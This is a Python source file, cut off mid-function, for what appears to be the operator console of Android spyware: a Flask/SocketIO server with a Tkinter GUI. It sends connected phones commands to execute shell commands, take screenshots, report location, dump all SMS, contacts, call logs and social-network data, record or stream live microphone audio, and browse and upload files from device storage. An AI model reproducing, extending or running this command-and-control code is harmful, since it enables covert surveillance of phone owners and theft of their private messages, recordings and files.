import os
import json
import datetime
import threading
import logging
import webbrowser
import subprocess
import sys
import time
import wave
import queue
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog, Menu
from tkinter import font as tkfont

try:
    import sounddevice as sd
    import numpy as np

    SOUNDDEVICE_AVAILABLE = True
except ImportError:
    SOUNDDEVICE_AVAILABLE = False
    print(
        "WARNING: sounddevice or numpy not found. Live audio playback will be disabled."
    )
except Exception as e:
    SOUNDDEVICE_AVAILABLE = False
    print(
        f"WARNING: Error importing sounddevice/numpy: {e}. Live audio playback will be disabled."
    )

try:
    from PIL import Image, ImageTk

    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print("WARNING: PIL not found. Image preview will be disabled.")

from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit


# --- Configuration ---
class AppConfig:
    APP_ROOT = os.path.dirname(os.path.abspath(__file__))
    DATA_RECEIVED_DIR = os.path.join(APP_ROOT, "received_data")
    DEVICE_TAGS_FILE = os.path.join(APP_ROOT, "device_tags.json")
    SETTINGS_FILE = os.path.join(APP_ROOT, "settings.json")
    SECRET_KEY = "Adv_Comm_Monitor_SecKey_V8_Complete_Enhanced_Features"

    # Audio parameters
    REC_SAMPLERATE = 16000
    REC_CHANNELS = 1
    REC_SAMPWIDTH = 2


# --- Theme Manager ---
class ThemeManager:
    def __init__(self):
        self.current_theme = "light"
        self.themes = {
            "light": {
                "bg": "#ffffff",
                "fg": "#000000",
                "select_bg": "#0078d4",
                "select_fg": "#ffffff",
                "entry_bg": "#ffffff",
                "entry_fg": "#000000",
                "button_bg": "#f0f0f0",
                "button_fg": "#000000",
                "frame_bg": "#f8f9fa",
                "text_bg": "#ffffff",
                "text_fg": "#000000",
                "listbox_bg": "#ffffff",
                "listbox_fg": "#000000",
                "menu_bg": "#f0f0f0",
                "menu_fg": "#000000",
                "status_success": "#28a745",
                "status_error": "#dc3545",
                "status_warning": "#ffc107",
                "status_info": "#17a2b8",
            },
            "dark": {
                "bg": "#2b2b2b",
                "fg": "#ffffff",
                "select_bg": "#0078d4",
                "select_fg": "#ffffff",
                "entry_bg": "#3c3c3c",
                "entry_fg": "#ffffff",
                "button_bg": "#404040",
                "button_fg": "#ffffff",
                "frame_bg": "#353535",
                "text_bg": "#2b2b2b",
                "text_fg": "#ffffff",
                "listbox_bg": "#3c3c3c",
                "listbox_fg": "#ffffff",
                "menu_bg": "#404040",
                "menu_fg": "#ffffff",
                "status_success": "#32d74b",
                "status_error": "#ff453a",
                "status_warning": "#ffcc02",
                "status_info": "#64d2ff",
            },
        }

    def get_theme(self, theme_name=None):
        if theme_name is None:
            theme_name = self.current_theme
        return self.themes.get(theme_name, self.themes["light"])

    def toggle_theme(self):
        self.current_theme = "dark" if self.current_theme == "light" else "light"
        return self.current_theme


# --- Enhanced Command Constants ---
class Commands:
    SIO_CMD_TAKE_SCREENSHOT = "command_take_screenshot"
    SIO_CMD_LIST_FILES = "command_list_files"
    SIO_CMD_GET_LOCATION = "command_get_location"
    SIO_CMD_UPLOAD_SPECIFIC_FILE = "command_upload_specific_file"
    SIO_CMD_EXECUTE_SHELL = "command_execute_shell"
    SIO_CMD_GET_SMS_LIST = "command_get_sms_list"
    SIO_CMD_GET_ALL_SMS = "command_get_all_sms"  # Enhanced unlimited SMS
    SIO_CMD_RECORD_AUDIO_FIXED = "command_record_audio_fixed"
    SIO_CMD_START_LIVE_AUDIO = "command_start_live_audio"
    SIO_CMD_STOP_LIVE_AUDIO = "command_stop_live_audio"
    SIO_EVENT_LIVE_AUDIO_CHUNK = "live_audio_chunk"
    SIO_CMD_GET_SOCIAL_NETWORK = "command_get_social_network_data"
    SIO_CMD_GET_COMMUNICATION_HISTORY = "command_get_communication_history"
    SIO_CMD_GET_CONTACTS_LIST = "command_get_contacts_list"
    SIO_CMD_GET_CALL_LOGS = "command_get_call_logs"
    SIO_EVENT_REQUEST_REGISTRATION_INFO = "request_registration_info"

    # Enhanced Document Library Commands
    SIO_CMD_CATALOG_LIBRARY = "command_catalog_library"
    SIO_CMD_ANALYZE_CONTENT = "command_analyze_content"
    SIO_CMD_PROCESS_QUEUE = "command_process_queue"


# --- Enhanced Utilities ---
class Utils:
    @staticmethod
    def sanitize_device_id(device_id):
        """تنظيف معرف الجهاز للاستخدام كاسم مجلد"""
        if not device_id or not isinstance(device_id, str) or len(device_id) < 3:
            return f"unidentified_device_{datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')}"

        sanitized = "".join(
            c if c.isalnum() or c in ["_", "-", "."] else "_" for c in device_id
        )

        if (
            not sanitized
            or sanitized.lower()
            in ["unknown_model_unknown_device", "_", "unknown_device_unknown_model"]
            or len(sanitized) < 3
        ):
            return f"unidentified_device_{datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')}"

        return sanitized

    @staticmethod
    def create_json_response(status, message=None, **kwargs):
        """إنشاء استجابة JSON موحدة"""
        response = {"status": status, "timestamp": datetime.datetime.now().isoformat()}
        if message:
            response["message"] = message
        response.update(kwargs)
        return response

    @staticmethod
    def get_file_icon(filename):
        """Get file icon based on extension"""
        ext = os.path.splitext(filename)[1].lower()
        icons = {
            ".json": "📊",
            ".txt": "📝",
            ".log": "📋",
            ".jpg": "🖼️",
            ".jpeg": "🖼️",
            ".png": "🖼️",
            ".gif": "🖼️",
            ".mp3": "🎵",
            ".wav": "🎵",
            ".3gp": "🎵",
            ".m4a": "🎵",
            ".mp4": "🎬",
            ".avi": "🎬",
            ".mov": "🎬",
            ".pdf": "📄",
            ".doc": "📄",
            ".docx": "📄",
            ".zip": "🗜️",
            ".rar": "🗜️",
            ".7z": "🗜️",
            ".apk": "📱",
            ".db": "🗃️",
            ".sqlite": "🗃️",
        }
        return icons.get(ext, "📄")

    @staticmethod
    def format_file_size(size_bytes):
        """Format file size in human readable format"""
        if size_bytes < 1024:
            return f"{size_bytes} B"
        elif size_bytes < 1024 * 1024:
            return f"{size_bytes / 1024:.1f} KB"
        elif size_bytes < 1024 * 1024 * 1024:
            return f"{size_bytes / (1024 * 1024):.1f} MB"
        else:
            return f"{size_bytes / (1024 * 1024 * 1024):.1f} GB"


# --- Settings Manager ---
class SettingsManager:
    def __init__(self):
        self.settings = self.load_settings()

    def load_settings(self):
        """تحميل الإعدادات من الملف"""
        try:
            if os.path.exists(AppConfig.SETTINGS_FILE):
                with open(AppConfig.SETTINGS_FILE, "r", encoding="utf-8") as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Error loading settings: {e}")

        return {
            "theme": "light",
            "auto_refresh": True,
            "sound_alerts": True,
            "battery_monitoring": True,
            "network_optimization": True,
            "compression_enabled": True,
            "max_file_display": 100,
            "window_geometry": "1200x800",
        }

    def save_settings(self):
        """حفظ الإعدادات إلى الملف"""
        try:
            with open(AppConfig.SETTINGS_FILE, "w", encoding="utf-8") as f:
                json.dump(self.settings, f, ensure_ascii=False, indent=4)
        except Exception as e:
            logger.error(f"Error saving settings: {e}")

    def get(self, key, default=None):
        return self.settings.get(key, default)

    def set(self, key, value):
        self.settings[key] = value
        self.save_settings()


# --- Enhanced Device Manager ---
class DeviceManager:
    def __init__(self):
        self.device_tags = {}
        self.device_stats = {}
        self.load_device_tags()

    def load_device_tags(self):
        """تحميل علامات الأجهزة من الملف"""
        try:
            if os.path.exists(AppConfig.DEVICE_TAGS_FILE):
                with open(AppConfig.DEVICE_TAGS_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    self.device_tags = data.get("tags", {})
                    self.device_stats = data.get("stats", {})
                logger.info(f"Loaded {len(self.device_tags)} device tags")
        except Exception as e:
            logger.error(f"Error loading device tags: {e}", exc_info=True)
            self.device_tags = {}
            self.device_stats = {}

    def save_device_tags(self):
        """حفظ علامات الأجهزة إلى الملف"""
        try:
            data = {
                "tags": self.device_tags,
                "stats": self.device_stats,
                "last_updated": datetime.datetime.now().isoformat(),
            }
            with open(AppConfig.DEVICE_TAGS_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=4)
            logger.info("Saved device data")
        except Exception as e:
            logger.error(f"Error saving device data: {e}", exc_info=True)

    def set_tag(self, device_id, tag):
        """وضع علامة على جهاز"""
        if tag.strip():
            self.device_tags[device_id] = tag.strip()
        else:
            self.device_tags.pop(device_id, None)
        self.save_device_tags()

    def get_tag(self, device_id):
        """الحصول على علامة الجهاز"""
        return self.device_tags.get(device_id, "")

    def update_stats(self, device_id, stat_type, value):
        """تحديث إحصائيات الجهاز"""
        if device_id not in self.device_stats:
            self.device_stats[device_id] = {}
        self.device_stats[device_id][stat_type] = value
        self.device_stats[device_id][
            "last_updated"
        ] = datetime.datetime.now().isoformat()

    def get_stats(self, device_id):
        """الحصول على إحصائيات الجهاز"""
        return self.device_stats.get(device_id, {})


# --- Flask App Setup ---
os.makedirs(AppConfig.DATA_RECEIVED_DIR, exist_ok=True)

app = Flask(__name__)
app.config["SECRET_KEY"] = AppConfig.SECRET_KEY
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading",
    logger=False,
    engineio_logger=False,
)

# Logging Setup
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("AdvancedCommMonitor")


# --- Remote File System Manager ---
class RemoteFileSystemManager:
    def __init__(self):
        self.file_cache = {}  # {device_id: {path: [files]}}
        self.last_update = {}  # {device_id: timestamp}
        self.pending_operations = {}  # {device_id: {command_id: {operation_details}}}

    def clear_cache(self, device_id=None):
        """Clear the file cache for a specific device or all devices"""
        if device_id:
            self.file_cache.pop(device_id, None)
            self.last_update.pop(device_id, None)
        else:
            self.file_cache.clear()
            self.last_update.clear()

    def add_files_to_cache(self, device_id, path, files_list):
        """Add files to the cache for a specific device and path"""
        if device_id not in self.file_cache:
            self.file_cache[device_id] = {}

        self.file_cache[device_id][path] = files_list
        self.last_update[device_id] = datetime.datetime.now()

    def get_files_from_cache(self, device_id, path):
        """Get files from cache for a specific device and path"""
        if device_id not in self.file_cache:
            return None
        return self.file_cache[device_id].get(path)

    def is_cache_valid(self, device_id, path, max_age_seconds=60):
        """Check if the cache is still valid"""
        if device_id not in self.last_update:
            return False
        if device_id not in self.file_cache or path not in self.file_cache[device_id]:
            return False
        age = (datetime.datetime.now() - self.last_update[device_id]).total_seconds()
        return age < max_age_seconds

    def add_pending_operation(
        self, device_id, command_id, operation_type, details=None
    ):
        """Add a pending operation for a device"""
        if device_id not in self.pending_operations:
            self.pending_operations[device_id] = {}
        self.pending_operations[device_id][command_id] = {
            "type": operation_type,
            "details": details or {},
            "timestamp": datetime.datetime.now().isoformat(),
        }

    def get_pending_operations(self, device_id):
        """Get all pending operations for a device"""
        return self.pending_operations.get(device_id, {})

    def remove_pending_operation(self, device_id, command_id):
        """Remove a pending operation"""
        if device_id in self.pending_operations:
            self.pending_operations[device_id].pop(command_id, None)


# --- Enhanced File Browser Window ---
class EnhancedFileBrowserWindow:
    def __init__(self, master, device_id, target_id, parent_app):
        self.master = master
        self.window = tk.Toplevel(master)
        self.window.title(f"📂 Enhanced File Browser - {device_id}")
        self.window.geometry("1000x700")
        self.window.minsize(900, 600)

        self.device_id = device_id
        self.current_device_id = device_id
        self.target_id = target_id
        self.parent_app = parent_app
        self.current_path = "/sdcard"
        self.path_history = ["/sdcard"]
        self.history_pos = 0

        # Apply current theme
        self.current_theme = theme_manager.get_theme()
        self.window.configure(bg=self.current_theme["bg"])

        # Common Android folders for quick access
        self.common_folders = [
            ("/sdcard", "📁 SD Card"),
            ("/storage/emulated/0", "📁 Internal Storage"),
            ("/sdcard/Download", "📁 Downloads"),
            ("/sdcard/DCIM", "📁 Camera"),
            ("/sdcard/Pictures", "📁 Pictures"),
            ("/sdcard/Documents", "📁 Documents"),
            ("/sdcard/Movies", "📁 Movies"),
            ("/sdcard/Music", "📁 Music"),
            ("/sdcard/Android/data", "📁 App Data"),
        ]

        self._setup_ui()
        self.list_files_for_path("/sdcard")
        self.window.protocol("WM_DELETE_WINDOW", self.close)

    def _setup_ui(self):
        """Set up the enhanced UI components"""
        # Main frame
        main_frame = tk.Frame(self.window, bg=self.current_theme["bg"])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Toolbar frame
        toolbar_frame = tk.Frame(main_frame, bg=self.current_theme["frame_bg"])
        toolbar_frame.pack(fill=tk.X, padx=5, pady=5)

        # Navigation buttons
        self.back_button = tk.Button(
            toolbar_frame,
            text="🔙 Back",
            command=self.go_back,
            bg=self.current_theme["button_bg"],
            fg=self.current_theme["button_fg"],
        )
        self.back_button.pack(side=tk.LEFT, padx=2)

        self.forward_button = tk.Button(
            toolbar_frame,
            text="🔜 Forward",
            command=self.go_forward,
            bg=self.current_theme["button_bg"],
            fg=self.current_theme["button_fg"],
        )
        self.forward_button.pack(side=tk.LEFT, padx=2)
        self.forward_button.config(state=tk.DISABLED)

        self.up_button = tk.Button(
            toolbar_frame,
            text="🔝 Up",
            command=self.go_up,
            bg=self.current_theme["button_bg"],
            fg=self.current_theme["button_fg"],
        )
        self.up_button.pack(side=tk.LEFT, padx=2)

        self.refresh_button = tk.Button(
            toolbar_frame,
            text="🔄 Refresh",
            command=self.refresh_current_directory,
            bg=self.current_theme["button_bg"],
            fg=self.current_theme["button_fg"],
        )
        self.refresh_button.pack(side=tk.LEFT, padx=2)

        # Path entry
        tk.Label(
            toolbar_frame,
            text="Path:",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
        ).pack(side=tk.LEFT, padx=(10, 2))
        self.path_var = tk.StringVar(value="/sdcard")
        self.path_entry = tk.Entry(
            toolbar_frame,
            textvariable=self.path_var,
            width=50,
            bg=self.current_theme["entry_bg"],
            fg=self.current_theme["entry_fg"],
        )
        self.path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        self.path_entry.bind("<Return>", lambda e: self.navigate_to_path())

        self.go_button = tk.Button(
            toolbar_frame,
            text="Go",
            command=self.navigate_to_path,
            bg=self.current_theme["button_bg"],
            fg=self.current_theme["button_fg"],
        )
        self.go_button.pack(side=tk.LEFT, padx=2)

        # Content frame (paned window for favorites and files)
        content_frame = tk.PanedWindow(
            main_frame, orient=tk.HORIZONTAL, bg=self.current_theme["bg"]
        )
        content_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Favorites frame
        favorites_frame = tk.LabelFrame(
            content_frame,
            text="Quick Access",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
        )
        content_frame.add(favorites_frame, width=250)

        self.favorites_listbox = tk.Listbox(
            favorites_frame,
            height=15,
            font=("Arial", 9),
            bg=self.current_theme["listbox_bg"],
            fg=self.current_theme["listbox_fg"],
            selectbackground=self.current_theme["select_bg"],
        )
        favorites_scrollbar = tk.Scrollbar(
            favorites_frame, orient="vertical", command=self.favorites_listbox.yview
        )
        self.favorites_listbox.config(yscrollcommand=favorites_scrollbar.set)

        self.favorites_listbox.pack(
            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5
        )
        favorites_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # Populate favorites
        for path, name in self.common_folders:
            self.favorites_listbox.insert(tk.END, name)
        self.favorites_listbox.bind("<Double-1>", self.on_favorite_double_click)

        # Files frame
        files_frame = tk.Frame(content_frame, bg=self.current_theme["bg"])
        content_frame.add(files_frame, width=750)

        # File list with details
        self.files_listbox = tk.Listbox(
            files_frame,
            font=("Consolas", 9),
            bg=self.current_theme["listbox_bg"],
            fg=self.current_theme["listbox_fg"],
            selectbackground=self.current_theme["select_bg"],
        )
        files_scrollbar = tk.Scrollbar(
            files_frame, orient="vertical", command=self.files_listbox.yview
        )
        self.files_listbox.config(yscrollcommand=files_scrollbar.set)

        self.files_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        files_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        self.files_listbox.bind("<Double-1>", self.on_file_double_click)
        self.files_listbox.bind("<Button-3>", self.on_file_right_click)

        # Status bar
        self.status_var = tk.StringVar(value="Ready")
        status_bar = tk.Label(
            main_frame,
            textvariable=self.status_var,
            relief=tk.SUNKEN,
            anchor=tk.W,
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
        )
        status_bar.pack(side=tk.BOTTOM, fill=tk.X, padx=5, pady=2)

        # Bottom buttons frame
        buttons_frame = tk.Frame(main_frame, bg=self.current_theme["bg"])
        buttons_frame.pack(fill=tk.X, padx=5, pady=5)

        self.upload_button = tk.Button(
            buttons_frame,
            text="📤 Upload Selected",
            command=self.upload_selected,
            bg=self.current_theme["status_success"],
            fg="#ffffff",
        )
        self.upload_button.pack(side=tk.LEFT, padx=5)

        self.analyze_button = tk.Button(
            buttons_frame,
            text="🔍 Analyze Selected",
            command=self.analyze_selected,
            bg=self.current_theme["status_info"],
            fg="#ffffff",
        )
        self.analyze_button.pack(side=tk.LEFT, padx=5)

    def on_favorite_double_click(self, event):
        """Handle double-click on favorite folder"""
        selection = self.favorites_listbox.curselection()
        if not selection:
            return
        index = selection[0]
        if 0 <= index < len(self.common_folders):
            path = self.common_folders[index][0]
            self.navigate_to_directory(path)

    def on_file_double_click(self, event):
        """Handle double-click on file with enhanced navigation"""
        selection = self.files_listbox.curselection()
        if not selection:
            return

        index = selection[0]
        selected_text = self.files_listbox.get(index)

        # Handle parent directory navigation
        if ".. (Parent Directory)" in selected_text:
            self.go_up()
            return

        # Handle regular files and directories
        if hasattr(self, "current_files") and self.current_files:
            # Adjust index for parent directory entry
            actual_index = index
            if self.current_path not in ["/", "/sdcard", ""] and index > 0:
                actual_index = index - 1  # Account for parent directory entry

            if actual_index < len(self.current_files):
                file_info = self.current_files[actual_index]

                if file_info.get("type") == "directory":
                    folder_name = file_info.get("name", "")
                    new_path = (
                        f"{self.current_path}/{folder_name}"
                        if not self.current_path.endswith("/")
                        else f"{self.current_path}{folder_name}"
                    )
                    self.navigate_to_directory(new_path)
                else:
                    # For files, show info or offer actions
                    file_name = file_info.get("name", "")
                    file_size = Utils.format_file_size(file_info.get("size", 0))
                    file_date = file_info.get("modified", "Unknown")

                    file_path = (
                        f"{self.current_path}/{file_name}"
                        if not self.current_path.endswith("/")
                        else f"{self.current_path}{file_name}"
                    )

                    # Create custom dialog for file actions
                    action_window = tk.Toplevel(self.window)
                    action_window.title("File Action")
                    action_window.geometry("400x250")
                    action_window.configure(bg=self.current_theme["bg"])
                    action_window.transient(self.window)
                    action_window.grab_set()

                    # Center the window
                    action_window.geometry(
                        f"+{self.window.winfo_x() + 100}+{self.window.winfo_y() + 100}"
                    )

                    # File info
                    info_frame = tk.Frame(
                        action_window, bg=self.current_theme["frame_bg"]
                    )
                    info_frame.pack(fill=tk.X, padx=10, pady=10)

                    tk.Label(
                        info_frame,
                        text=f"📄 File: {file_name}",
                        bg=self.current_theme["frame_bg"],
                        fg=self.current_theme["fg"],
                        font=("Arial", 10, "bold"),
                    ).pack(anchor="w")
                    tk.Label(
                        info_frame,
                        text=f"📊 Size: {file_size}",
                        bg=self.current_theme["frame_bg"],
                        fg=self.current_theme["fg"],
                    ).pack(anchor="w")
                    tk.Label(
                        info_frame,
                        text=f"📅 Modified: {file_date}",
                        bg=self.current_theme["frame_bg"],
                        fg=self.current_theme["fg"],
                    ).pack(anchor="w")
                    tk.Label(
                        info_frame,
                        text=f"📂 Path: {file_path}",
                        bg=self.current_theme["frame_bg"],
                        fg=self.current_theme["fg"],
                        wraplength=350,
                    ).pack(anchor="w")

                    # Action buttons
                    button_frame = tk.Frame(action_window, bg=self.current_theme["bg"])
                    button_frame.pack(fill=tk.X, padx=10, pady=10)

                    def upload_action():
                        action_window.destroy()
                        result = send_command_to_client(
                            self.target_id,
                            Commands.SIO_CMD_UPLOAD_SPECIFIC_FILE,
                            args={"path": file_path},
                        )
                        if result.get("status") == "sent":
                            self.status_var.set(f"📤 Upload requested for: {file_name}")
                            self.parent_app.add_system_log(
                                f"📤 Upload requested: {file_path}", "success"
                            )

                    def analyze_action():
                        action_window.destroy()
                        result = send_command_to_client(
                            self.target_id,
                            Commands.SIO_CMD_ANALYZE_CONTENT,
                            args={"filePath": file_path},
                        )
                        if result.get("status") == "sent":
                            self.status_var.set(
                                f"🔍 Analysis requested for: {file_name}"
                            )
                            self.parent_app.add_system_log(
                                f"🔍 Analysis requested: {file_path}", "success"
                            )

                    def copy_action():
                        action_window.destroy()
                        self.window.clipboard_clear()
                        self.window.clipboard_append(file_path)
                        self.status_var.set(f"📋 Copied to clipboard: {file_path}")

                    def cancel_action():
                        action_window.destroy()

                    tk.Button(
                        button_frame,
                        text="📤 Upload File",
                        command=upload_action,
                        bg=self.current_theme["status_success"],
                        fg="#ffffff",
                        width=15,
                    ).pack(side=tk.LEFT, padx=5)
                    tk.Button(
                        button_frame,
                        text="🔍 Analyze File",
                        command=analyze_action,
                        bg=self.current_theme["status_info"],
                        fg="#ffffff",
                        width=15,
                    ).pack(side=tk.LEFT, padx=5)
                    tk.Button(
                        button_frame,
                        text="📋 Copy Path",
                        command=copy_action,
                        bg=self.current_theme["button_bg"],
                        fg=self.current_theme["button_fg"],
                        width=15,
                    ).pack(side=tk.LEFT, padx=5)
                    tk.Button(
                        button_frame,
                        text="❌ Cancel",
                        command=cancel_action,
                        bg=self.current_theme["button_bg"],
                        fg=self.current_theme["button_fg"],
                        width=15,
                    ).pack(side=tk.LEFT, padx=5)

    def on_file_right_click(self, event):
        """Handle right-click on file"""
        self.files_listbox.selection_clear(0, tk.END)
        self.files_listbox.selection_set(self.files_listbox.nearest(event.y))

        context_menu = Menu(self.window, tearoff=0)
        context_menu.add_command(label="📤 Upload", command=self.upload_selected)
        context_menu.add_command(label="🔍 Analyze", command=self.analyze_selected)
        context_menu.add_command(
            label="📋 Copy Path", command=self.copy_path_to_clipboard
        )

        try:
            context_menu.tk_popup(event.x_root, event.y_root)
        finally:
            context_menu.grab_release()

    def navigate_to_directory(self, path):
        """Navigate to a directory"""
        if self.current_path != path:
            if self.history_pos < len(self.path_history) - 1:
                self.path_history = self.path_history[: self.history_pos + 1]
            self.path_history.append(path)
            self.history_pos = len(self.path_history) - 1
            self.back_button.config(
                state=tk.NORMAL if self.history_pos > 0 else tk.DISABLED
            )
            self.forward_button.config(state=tk.DISABLED)

        self.current_path = path
        self.path_var.set(path)
        self.list_files_for_path(path)

    def go_back(self):
        """Navigate back in history"""
        if self.history_pos > 0:
            self.history_pos -= 1
            path = self.path_history[self.history_pos]
            self.current_path = path
            self.path_var.set(path)
            self.list_files_for_path(path)
            self.back_button.config(
                state=tk.NORMAL if self.history_pos > 0 else tk.DISABLED
            )
            self.forward_button.config(state=tk.NORMAL)

    def go_forward(self):
        """Navigate forward in history"""
        if self.history_pos < len(self.path_history) - 1:
            self.history_pos += 1
            path = self.path_history[self.history_pos]
            self.current_path = path
            self.path_var.set(path)
            self.list_files_for_path(path)
            self.forward_button.config(
                state=(
                    tk.NORMAL
                    if self.history_pos < len(self.path_history) - 1
                    else tk.DISABLED
                )
            )
            self.back_button.config(state=tk.NORMAL)

    def go_up(self):
        """Navigate to parent directory"""
        if self.current_path in ["/", "", "/sdcard"]:
            return
        parent_path = "/".join(self.current_path.split("/")[:-1]) or "/sdcard"
        self.navigate_to_directory(parent_path)

    def navigate_to_path(self):
        """Navigate to the path in the entry field"""
        path = self.path_var.get() or "/sdcard"
        self.navigate_to_directory(path)

    def list_files_for_path(self, path):
        """Request file listing for a path with enhanced error handling"""
        if not self.target_id:
            self.status_var.set("❌ Error: No connected device")
            self.files_listbox.delete(0, tk.END)
            self.files_listbox.insert(0, "❌ No device connected")
            return

        # Verify device is still connected
        if self.target_id not in connected_clients_sio:
            self.status_var.set("❌ Error: Device disconnected")
            self.files_listbox.delete(0, tk.END)
            self.files_listbox.insert(0, "❌ Device disconnected")

            # Show reconnection message
            def show_reconnect_message():
                if hasattr(self, "window") and self.window.winfo_exists():
                    messagebox.showwarning(
                        "Device Disconnected",
                        f"The device '{self.device_id}' has disconnected.\n"
                        f"Please reconnect the device to continue browsing files.",
                        parent=self.window,
                    )

            self.window.after(1000, show_reconnect_message)
            return

        if path == "/":
            path = "/sdcard"
            self.current_path = "/sdcard"
            self.path_var.set("/sdcard")

        self.status_var.set(f"🔄 Loading files from: {path}...")
        self.files_listbox.delete(0, tk.END)
        self.files_listbox.insert(0, "⏳ Loading files...")
        self.window.update()

        # Check cache first
        if remote_fs_manager.is_cache_valid(self.device_id, path):
            self.populate_files_from_cache(path)
            return

        # Request from device with timeout handling
        try:
            result = send_command_to_client(
                self.target_id,
                Commands.SIO_CMD_LIST_FILES,
                args={"path": path},
                timeout_seconds=20,  # Shorter timeout for file operations
            )

            if result.get("status") == "sent":
                self.current_path = path
                self.path_var.set(path)
                command_id = result["command_id"]
                device_id = result.get("device_id", self.device_id)

                remote_fs_manager.add_pending_operation(
                    device_id, command_id, "list_files", {"path": path}
                )

                # Set up timeout for this specific request
                def check_file_list_timeout():
                    if hasattr(self, "window") and self.window.winfo_exists():
                        # Check if we still have the same loading state
                        if (
                            self.files_listbox.size() == 1
                            and "Loading files" in self.files_listbox.get(0)
                        ):
                            self.files_listbox.delete(0, tk.END)
                            self.files_listbox.insert(
                                0, f"⏰ Request timed out for: {path}"
                            )
                            self.files_listbox.insert(
                                1, "🔄 Click Refresh to try again"
                            )
                            self.status_var.set(
                                f"⏰ Request timed out - Try refreshing"
                            )

                            # Remove pending operation
                            remote_fs_manager.remove_pending_operation(
                                device_id, command_id
                            )

                self.window.after(20000, check_file_list_timeout)  # 20 second timeout

            else:
                error_msg = result.get("message", "Unknown error")
                self.files_listbox.delete(0, tk.END)
                self.files_listbox.insert(0, f"❌ Error: {error_msg}")
                self.files_listbox.insert(1, "🔄 Click Refresh to try again")
                self.status_var.set(f"❌ Error requesting file list: {error_msg}")

                # Suggest alternative paths
                if "permission" in error_msg.lower() or "access" in error_msg.lower():
                    self.files_listbox.insert(
                        2, "💡 Try /sdcard/Download or /sdcard/Pictures"
                    )
                elif path != "/sdcard":
                    self.files_listbox.insert(2, "💡 Try /sdcard instead")

        except Exception as e:
            error_msg = str(e)
            self.files_listbox.delete(0, tk.END)
            self.files_listbox.insert(0, f"❌ Exception: {error_msg}")
            self.files_listbox.insert(1, "🔄 Click Refresh to try again")
            self.status_var.set(f"❌ Exception during file list request: {error_msg}")

            logger.error(f"Exception in list_files_for_path: {e}", exc_info=True)

            # Log to parent app if available
            if hasattr(self, "parent_app") and self.parent_app:
                self.parent_app.add_system_log(
                    f"❌ File browser error: {error_msg}", "error"
                )

    def populate_files_from_cache(self, path):
        """Populate files from cache with better error handling"""
        try:
            files = remote_fs_manager.get_files_from_cache(self.device_id, path)
            self.files_listbox.delete(0, tk.END)

            if files and len(files) > 0:
                self.current_files = files
                directories = [f for f in files if f.get("type") == "directory"]
                regular_files = [f for f in files if f.get("type") != "directory"]

                directories.sort(key=lambda x: x.get("name", "").lower())
                regular_files.sort(key=lambda x: x.get("name", "").lower())

                # Add parent directory option if not at root
                if path not in ["/", "/sdcard", ""]:
                    self.files_listbox.insert(tk.END, "📁 .. (Parent Directory)")

                total_items = 0
                for file_info in directories + regular_files:
                    try:
                        name = file_info.get("name", "Unknown")
                        size = file_info.get("size", 0)
                        date = file_info.get("modified", "Unknown")
                        file_type = file_info.get("type", "file")

                        icon = (
                            "📁"
                            if file_type == "directory"
                            else Utils.get_file_icon(name)
                        )

                        if file_type == "directory":
                            size_str = "DIR"
                        else:
                            size_str = Utils.format_file_size(size)

                        # Format the display line with proper spacing
                        display_line = f"{icon} {name:<35} {size_str:>10} {date}"
                        self.files_listbox.insert(tk.END, display_line)
                        total_items += 1

                    except Exception as item_error:
                        logger.warning(f"Error processing file item: {item_error}")
                        self.files_listbox.insert(
                            tk.END, f"❌ Error processing item: {file_info}"
                        )

                self.status_var.set(f"✅ Loaded {total_items} items from {path}")

                # Store current files for operations
                if not hasattr(self, "current_files"):
                    self.current_files = []

            else:
                self.files_listbox.insert(
                    tk.END, "📭 No files found or directory not accessible"
                )
                if path in ["/", ""]:
                    self.files_listbox.insert(tk.END, "💡 Try navigating to /sdcard")
                self.status_var.set(f"📭 No files found in {path}")
                self.current_files = []

        except Exception as e:
            logger.error(f"Error in populate_files_from_cache: {e}", exc_info=True)
            self.files_listbox.delete(0, tk.END)
            self.files_listbox.insert(tk.END, f"❌ Error loading files: {e}")
            self.files_listbox.insert(tk.END, "🔄 Try refreshing the directory")
            self.status_var.set(f"❌ Error loading files: {e}")
            self.current_files = []

    def refresh_current_directory(self):
        """Refresh the current directory listing"""
        remote_fs_manager.clear_cache(self.device_id)
        self.list_files_for_path(self.current_path)

    def upload_selected(self):
        """Upload the selected file"""
        selection = self.files_listbox.curselection()
        if not selection:
            messagebox.showinfo(
                "Select File",
                "Please select a file to upload from the file list (not from Quick Access).",
                parent=self.window,
            )
            return

        # Check if we actually have file data loaded
        if not hasattr(self, "current_files") or not self.current_files:
            messagebox.showinfo(
                "No Files",
                "No files are currently loaded. Please navigate to a directory first.",
                parent=self.window,
            )
            return

        index = selection[0]
        if index >= len(self.current_files):
            messagebox.showinfo(
                "Invalid Selection", "Selected item is not valid.", parent=self.window
            )
            return

        file_info = self.current_files[index]
        if file_info.get("type") == "directory":
            messagebox.showinfo(
                "Select File",
                "Please select a file, not a directory.",
                parent=self.window,
            )
            return

        file_name = file_info.get("name", "")
        file_path = (
            f"{self.current_path}/{file_name}"
            if not self.current_path.endswith("/")
            else f"{self.current_path}{file_name}"
        )

        result = send_command_to_client(
            self.target_id,
            Commands.SIO_CMD_UPLOAD_SPECIFIC_FILE,
            args={"path": file_path},
        )
        if result.get("status") == "sent":
